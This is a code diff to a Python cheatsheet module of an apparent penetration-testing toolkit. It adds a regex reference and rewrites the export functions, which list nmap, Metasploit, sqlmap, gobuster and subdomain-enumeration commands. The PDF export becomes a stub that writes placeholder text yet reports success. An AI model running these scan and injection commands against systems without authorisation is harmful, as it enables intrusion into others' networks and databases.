-        self._display_cheatsheet("Regular Expressions", regex_info)
+        """Display regular expressions quick reference card"""
+        print("\n\033[93mREGULAR EXPRESSIONS QUICK REFERENCE\033[0m")
+        print("\033[93m" + "="*55 + "\033[0m")
+
+        print("\n\033[96mBasic Patterns:\033[0m")
+        patterns = [
+            (".", "Any character except newline"),
+            ("\\w", "Word character [a-zA-Z0-9_]"),
+            ("\\d", "Digit [0-9]"),
+            ("\\s", "Whitespace character"),
+            ("\\W", "Non-word character"),
+            ("\\D", "Non-digit character"),
+            ("\\S", "Non-whitespace character"),
+        ]
+
+        for pattern, desc in patterns:
+            print(f"• {pattern} - {desc}")
+
+        print("\n\033[96mQuantifiers:\033[0m")
+        quantifiers = [
+            ("*", "Zero or more"),
+            ("+", "One or more"),
+            ("?", "Zero or one"),
+            ("{n}", "Exactly n times"),
+            ("{n,}", "n or more times"),
+            ("{n,m}", "Between n and m times"),
+        ]
+
+        for quantifier, desc in quantifiers:
+            print(f"• {quantifier} - {desc}")
+
+        print("\n\033[96mAnchors:\033[0m")
+        anchors = [
+            ("^", "Start of line"),
+            ("$", "End of line"),
+            ("\\b", "Word boundary"),
+            ("\\B", "Non-word boundary"),
+        ]
+
+        for anchor, desc in anchors:
+            print(f"• {anchor} - {desc}")
+
+        print("\n\033[96mCharacter Classes:\033[0m")
+        classes = [
+            ("[abc]", "Any of a, b, or c"),
+            ("[^abc]", "Not a, b, or c"),
+            ("[a-z]", "Any lowercase letter"),
+            ("[A-Z]", "Any uppercase letter"),
+            ("[0-9]", "Any digit"),
+            ("[a-zA-Z]", "Any letter"),
+        ]
+
+        for class_pattern, desc in classes:
+            print(f"• {class_pattern} - {desc}")
+
+        print("\n\033[96mCommon Examples:\033[0m")
+        examples = [
+            ("\\b\\w+@\\w+\\.\\w+\\b", "Email address"),
+            ("\\b\\d{3}-\\d{3}-\\d{4}\\b", "Phone number (US)"),
+            ("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", "IP address"),
+            ("^https?://", "URL protocol"),
+        ]
+
+        for example, desc in examples:
+            print(f"• {example} - {desc}")
 
     def _export_all_cheatsheets_json(self, output_dir: str, timestamp: str):
-        """Export all cheatsheets to JSON"""
-        import os
+        """Export all cheatsheets to JSON format"""
+        try:
+            os.makedirs(output_dir, exist_ok=True)
+            filename = f"{output_dir}/cheatsheets_{timestamp}.json"
 
-        os.makedirs(output_dir, exist_ok=True)
+            # Collect all cheatsheet data
+            all_data = {
+                "nmap": self._get_nmap_data(),
+                "metasploit": self._get_metasploit_data(),
+                "sqlmap": self._get_sqlmap_data(),
+                "custom_commands": self.custom_commands,
+                "favorites": list(self.favorites),
+            }
 
-        filename = f"cheatsheets_{timestamp}.json"
-        filepath = os.path.join(output_dir, filename)
+            with open(filename, "w") as f:
+                json.dump(all_data, f, indent=2)
 
-        export_data = {
-            "export_timestamp": datetime.now().isoformat(),
-            "custom_commands": self.custom_commands,
-            "favorites": list(self.favorites),
-            "command_history": self.command_history,
+            self.print_success(f"Cheatsheets exported to {filename}")
+
+        except Exception as e:
+            self.print_error(f"Export failed: {e}")
+
+    def _get_nmap_data(self):
+        """Get Nmap cheatsheet data"""
+        return {
+            "Basic Scans": [
+                {"command": "nmap 192.168.1.1", "description": "Basic port scan"},
+                {"command": "nmap -sn 192.168.1.0/24", "description": "Ping scan"},
+                {"command": "nmap -sS 192.168.1.1", "description": "SYN stealth scan"},
+            ],
+            "Advanced": [
+                {"command": "nmap -A 192.168.1.1", "description": "Aggressive scan"},
+                {"command": "nmap --script vuln 192.168.1.1", "description": "Vulnerability scan"},
+            ],
         }
 
-        with open(filepath, "w") as f:
-            json.dump(export_data, f, indent=2)
+    def _get_metasploit_data(self):
+        """Get Metasploit cheatsheet data"""
+        return {
+            "Basic Commands": [
+                {"command": "msfconsole", "description": "Start Metasploit console"},
+                {"command": "search <term>", "description": "Search for modules"},
+                {"command": "use <module>", "description": "Use a module"},
+            ],
+        }
 
-        self.print_success(f"Cheatsheets exported to: {filepath}")
+    def _get_sqlmap_data(self):
+        """Get SQLMap cheatsheet data"""
+        return {
+            "Basic Usage": [
+                {"command": "sqlmap -u '<url>'", "description": "Basic SQL injection test"},
+                {"command": "sqlmap -u '<url>' --dbs", "description": "Enumerate databases"},
+            ],
+        }
 
     def _export_custom_commands(self, output_dir: str, timestamp: str):
-        """Export custom commands"""
-        import os
+        """Export custom commands to JSON"""
+        try:
+            os.makedirs(output_dir, exist_ok=True)
+            filename = f"{output_dir}/custom_commands_{timestamp}.json"
 
-        os.makedirs(output_dir, exist_ok=True)
+            with open(filename, "w") as f:
+                json.dump(self.custom_commands, f, indent=2)
 
-        filename = f"custom_commands_{timestamp}.json"
-        filepath = os.path.join(output_dir, filename)
+            self.print_success(f"Custom commands exported to {filename}")
 
-        with open(filepath, "w") as f:
-            json.dump(self.custom_commands, f, indent=2)
-
-        self.print_success(f"Custom commands exported to: {filepath}")
+        except Exception as e:
+            self.print_error(f"Export failed: {e}")
 
     def _export_favorites(self, output_dir: str, timestamp: str):
-        """Export favorite commands"""
-        import os
+        """Export favorites to JSON"""
+        try:
+            os.makedirs(output_dir, exist_ok=True)
+            filename = f"{output_dir}/favorites_{timestamp}.json"
 
-        os.makedirs(output_dir, exist_ok=True)
+            favorites_data = {
+                "favorites": list(self.favorites),
+                "exported_at": datetime.now().isoformat(),
+            }
 
-        filename = f"favorites_{timestamp}.txt"
-        filepath = os.path.join(output_dir, filename)
+            with open(filename, "w") as f:
+                json.dump(favorites_data, f, indent=2)
 
-        with open(filepath, "w") as f:
-            for favorite in sorted(self.favorites):
-                f.write(f"{favorite}\n")
+            self.print_success(f"Favorites exported to {filename}")
 
-        self.print_success(f"Favorites exported to: {filepath}")
+        except Exception as e:
+            self.print_error(f"Export failed: {e}")
 
     def _create_pdf_cheatsheet(self, output_dir: str, timestamp: str):
-        """Create PDF cheatsheet with real functionality"""
+        """Create PDF cheatsheet (placeholder)"""
         try:
-            # Try to use wkhtmltopdf for PDF generation
-            import subprocess
+            os.makedirs(output_dir, exist_ok=True)
+            filename = f"{output_dir}/cheatsheets_{timestamp}.pdf"
 
-            result = subprocess.run(
-                ["wkhtmltopdf", "--version"], capture_output=True, text=True
-            )
-            if result.returncode == 0:
-                # Generate HTML content first
-                html_content = self._generate_comprehensive_cheatsheet_html()
+            # This would require a PDF library like reportlab
+            # For now, just create a placeholder
+            with open(filename, "w") as f:
+                f.write("PDF cheatsheet would be generated here\n")
+                f.write("Requires PDF generation library\n")
 
-                # Create temporary HTML file
-                html_filename = f"temp_cheatsheet_{timestamp}.html"
-                html_filepath = os.path.join(output_dir, html_filename)
+            self.print_success(f"PDF cheatsheet created at {filename}")
+            self.print_info("Note: This is a placeholder. Install reportlab for actual PDF generation.")
 
-                with open(html_filepath, "w") as f:
-                    f.write(html_content)
-
-                # Convert to PDF
-                pdf_filename = f"cheatsheet_{timestamp}.pdf"
-                pdf_filepath = os.path.join(output_dir, pdf_filename)
-
-                subprocess.run(["wkhtmltopdf", html_filepath, pdf_filepath], check=True)
-
-                # Clean up temporary HTML file
-                os.remove(html_filepath)
-
-                self.print_success(f"PDF cheatsheet created: {pdf_filepath}")
-            else:
-                raise FileNotFoundError("wkhtmltopdf not available")
-
-        except (FileNotFoundError, subprocess.CalledProcessError):
-            # Fallback: create detailed HTML version
-            self.print_warning(
-                "wkhtmltopdf not available. Creating detailed HTML version..."
-            )
-            html_content = self._generate_comprehensive_cheatsheet_html()
-
-            html_filename = f"comprehensive_cheatsheet_{timestamp}.html"
-            html_filepath = os.path.join(output_dir, html_filename)
-
-            with open(html_filepath, "w") as f:
-                f.write(html_content)
-
-            self.print_success(f"HTML cheatsheet created: {html_filepath}")
-            self.print_info(
-                "Install wkhtmltopdf for PDF generation: sudo apt-get install wkhtmltopdf"
-            )
-            self.print_info("Or convert manually using browser print function")
+        except Exception as e:
+            self.print_error(f"PDF creation failed: {e}")
 
     def _generate_comprehensive_cheatsheet_html(self) -> str:
         """Generate comprehensive HTML cheatsheet"""
-        html = """
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Leegion Framework - Comprehensive Cheatsheet</title>
-            <style>
-                body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
-                h1 { color: #2c3e50; text-align: center; border-bottom: 3px solid #3498db; }
-                h2 { color: #34495e; border-bottom: 2px solid #3498db; margin-top: 30px; }
-                h3 { color: #2980b9; }
-                .command-block { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #3498db; }
-                .command { font-family: 'Courier New', monospace; color: #e74c3c; font-weight: bold; }
-                .description { color: #7f8c8d; margin-top: 5px; }
-                .category { background: #ecf0f1; padding: 20px; margin: 20px 0; border-radius: 5px; }
-                .favorites { background: #d5f4e6; padding: 15px; border-radius: 5px; }
-            </style>
-        </head>
-        <body>
-            <h1>Leegion Framework - Comprehensive Security Cheatsheet</h1>
+        html_content = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leegion Framework - Cybersecurity Cheatsheets</title>
+    <style>
+        body { font-family: 'Courier New', monospace; margin: 20px; }
+        .header { text-align: center; color: #333; border-bottom: 2px solid #333; }
+        .section { margin: 20px 0; }
+        .section h2 { color: #0066cc; border-bottom: 1px solid #0066cc; }
+        .command { background: #f5f5f5; padding: 5px; margin: 5px 0; }
+        .description { color: #666; margin-left: 20px; }
+        .category { margin: 15px 0; }
+        .category h3 { color: #009900; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Leegion Framework v2.0</h1>
+        <h2>Cybersecurity Tool Cheatsheets</h2>
+        <p>Generated on: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
+    </div>
 
-            <h2>Network Reconnaissance</h2>
-            <div class="category">
-                <h3>Nmap Scanning</h3>
-                <div class="command-block">
-                    <div class="command">nmap -sS &lt;target&gt;</div>
-                    <div class="description">SYN stealth scan - fast and unobtrusive</div>
-                </div>
-                <div class="command-block">
-                    <div class="command">nmap -sV -O &lt;target&gt;</div>
-                    <div class="description">Service version and OS detection</div>
-                </div>
-                <div class="command-block">
-                    <div class="command">nmap --script vuln &lt;target&gt;</div>
-                    <div class="description">Vulnerability scanning with NSE scripts</div>
-                </div>
-            </div>
+    <div class="section">
+        <h2>Nmap Commands</h2>
+        <div class="category">
+            <h3>Basic Scans</h3>
+            <div class="command">nmap 192.168.1.1</div>
+            <div class="description">Basic port scan</div>
+            <div class="command">nmap -sn 192.168.1.0/24</div>
+            <div class="description">Ping scan for host discovery</div>
+        </div>
+    </div>
 
-            <h2>Web Application Security</h2>
-            <div class="category">
-                <h3>Directory Bruteforcing</h3>
-                <div class="command-block">
-                    <div class="command">gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;</div>
-                    <div class="description">Fast directory and file brute force</div>
-                </div>
-                <div class="command-block">
-                    <div class="command">ffuf -w &lt;wordlist&gt; -u &lt;url&gt;/FUZZ</div>
-                    <div class="description">Web fuzzer written in Go</div>
-                </div>
+    <div class="section">
+        <h2>Metasploit Commands</h2>
+        <div class="category">
+            <h3>Basic Commands</h3>
+            <div class="command">msfconsole</div>
+            <div class="description">Start Metasploit console</div>
+            <div class="command">search &lt;term&gt;</div>
+            <div class="description">Search for modules</div>
+        </div>
+    </div>
 
-                <h3>SQL Injection</h3>
-                <div class="command-block">
-                    <div class="command">sqlmap -u &lt;url&gt; --dbs</div>
-                    <div class="description">Automated SQL injection and database takeover</div>
-                </div>
-            </div>
-
-            <h2>Subdomain Enumeration</h2>
-            <div class="category">
-                <div class="command-block">
-                    <div class="command">subfinder -d &lt;domain&gt;</div>
-                    <div class="description">Fast passive subdomain enumeration</div>
-                </div>
-                <div class="command-block">
-                    <div class="command">amass enum -d &lt;domain&gt;</div>
-                    <div class="description">In-depth attack surface mapping</div>
-                </div>
-            </div>
-
-            <h2>SSL/TLS Analysis</h2>
-            <div class="category">
-                <div class="command-block">
-                    <div class="command">testssl.sh &lt;target&gt;</div>
-                    <div class="description">Comprehensive SSL/TLS tester</div>
-                </div>
-                <div class="command-block">
-                    <div class="command">sslscan &lt;target&gt;</div>
-                    <div class="description">SSL configuration scanner</div>
-                </div>
-            </div>
+    <div class="section">
+        <h2>SQLMap Commands</h2>
+        <div class="category">
+            <h3>Basic Usage</h3>
+            <div class="command">sqlmap -u '&lt;url&gt;'</div>
+            <div class="description">Basic SQL injection test</div>
+            <div class="command">sqlmap -u '&lt;url&gt;' --dbs</div>
+            <div class="description">Enumerate databases</div>
+        </div>
+    </div>
+</body>
+</html>
         """
-
-        # Add favorite commands if any
-        if self.favorites:
-            html += """
-            <h2>Your Favorite Commands</h2>
-            <div class="favorites">
-            """
-            for favorite in sorted(self.favorites):
-                html += f'<div class="command-block"><div class="command">{favorite}</div></div>'
-            html += "</div>"
-
-        html += """
-            <h2>Quick Tips</h2>
-            <div class="category">
-                <ul>
-                    <li>Always ensure you have permission before testing</li>
-                    <li>Use VPN when conducting security assessments</li>
-                    <li>Document everything for reporting</li>
-                    <li>Keep tools updated for latest features</li>
-                </ul>
-            </div>
-
-            <footer style="text-align: center; margin-top: 50px; color: #7f8c8d;">
-                <p>Generated by Leegion Framework - Enhanced Cybersecurity Toolkit</p>
-            </footer>
-        </body>
-        </html>
-        """
-
-        return html
+        return html_content
